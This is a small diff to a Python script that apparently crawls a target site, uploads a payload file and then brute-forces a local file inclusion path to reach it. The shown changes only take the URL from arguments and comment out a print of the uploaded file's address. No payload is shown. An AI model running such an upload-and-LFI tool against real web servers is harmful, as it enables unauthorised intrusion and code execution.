@@ -49,10 +49,10 @@ def main():
     session = requests.Session()
     
     # Main function
-    found_urls, uploadable_urls = crawler.main_crawl(URL, WORDLIST, COOKIE)
+    found_urls, uploadable_urls = crawler.main_crawl(args.url, WORDLIST, COOKIE)
     print("Crawling complete.")
 
-    found_urls = crawler.clean_found_urls(URL, found_urls)
+    found_urls = crawler.clean_found_urls(args.url, found_urls)
 
     print ("Found URLs:")
     for url in found_urls:
@@ -103,8 +103,8 @@ def main():
     #     exit(1)
 
     # Direct URL to the uploaded file (if you can access it directly)
-    direct_file_url = f"{UPLOAD_DIR}{PAYLOAD_FILENAME}"
-    print(f"[+] Direct file URL (if accessible): {direct_file_url}")
+    # direct_file_url = f"{UPLOAD_DIR}{PAYLOAD_FILENAME}"
+    # print(f"[+] Direct file URL (if accessible): {direct_file_url}")
 
     # --- LFI Brute Force Phase ---
     payload_relative = dynamic_upload_dir + PAYLOAD_FILENAME  # relative path from base URL
